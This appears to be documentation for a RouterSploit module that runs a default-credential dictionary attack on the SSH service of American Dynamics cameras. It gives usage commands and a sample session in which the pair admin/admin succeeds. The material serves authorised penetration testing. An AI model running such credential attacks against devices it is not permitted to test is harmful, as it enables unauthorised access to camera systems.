## Description

Module performs dictionary attack with default credentials against American Dynamics Camera SSH service.
If valid credentials are found, they are displayed to the user.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use creds/cameras/american_dynamics/ssh_default_creds`
  3. Do: `set target [TargetIP]`
  4. Do: `run`
  5. If valid credentials are found, they are displayed to the user.

## Scenarios

```
rsf > use creds/cameras/american_dynamics/ssh_default_creds
rsf (American Dynamics Camera Default SSH Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (American Dynamics Camera Default SSH Creds) > run
[*] Running module...
[*] Target exposes SSH service
[*] Starting default credentials attack against SSH service
[*] thread-0 thread is starting...
[-] SSH Authentication Failed - Username: 'admin' Password: '12345'
[-] SSH Authentication Failed - Username: 'admin' Password: '123456'
[-] SSH Authentication Failed - Username: 'Admin' Password: '12345'
[-] SSH Authentication Failed - Username: 'Admin' Password: '123456'
[+] SSH Authentication Successful - Username: 'admin' Password: 'admin'
[*] thread-0 thread is terminated.
[*] Elapsed time: 2.3932292461395264 seconds
[+] Credentials found!

   Target          Port     Service     Username     Password
   ------          ----     -------     --------     --------
   192.168.1.1     22       ssh         admin        admin 

```
